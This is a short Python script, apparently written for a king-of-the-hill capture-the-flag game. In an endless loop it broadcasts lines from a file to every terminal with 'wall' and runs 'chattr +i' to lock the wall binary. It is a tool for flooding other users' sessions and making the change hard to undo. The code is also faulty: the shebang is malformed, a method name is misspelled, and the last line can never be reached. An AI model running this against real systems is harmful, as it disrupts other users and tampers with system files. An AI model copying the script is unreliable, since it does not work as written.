#/usr/bin/python
import os
import subprocess

with open("Urandoms.sh","rb") as f:
        k = f.readlline()
#read the created urandoms
while 1:
        for i in k:
                os.system("chattr +i /usr/bin/wall")
                os.system("wall -t 100 "+i)
os.system("watch -n 1 /root/king.txt")
